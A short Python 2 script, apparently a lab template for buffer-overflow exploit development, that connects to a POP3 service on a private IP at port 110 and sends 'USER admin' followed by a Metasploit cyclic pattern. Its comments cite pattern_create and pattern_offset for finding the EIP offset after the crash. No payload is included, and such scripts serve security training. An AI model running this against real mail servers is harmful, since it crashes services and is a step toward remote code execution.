#!/usr/bin/python

import sys,socket

#Variables
server = '192.168.253.129'
port = 110
command = "USER admin"
offset = ""
#:::GENERATE OFFSET PATTERN AND ADD TO VARIABLE ABOVE:::
#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

#Printing current byte count, connecting to server, and grabbing banner
print '[+] Connecting to server' 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((server,port))
s.recv(1024)
#Sending command plus offset to server
print '[+] Sending command + offset'
s.send(command + offset + '\r\n')
s.recv(1024)
print '[+] Done'
s.close()

#:::FIND OFFSET AFTER CRASHING APPLICATION:::
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q eipvalue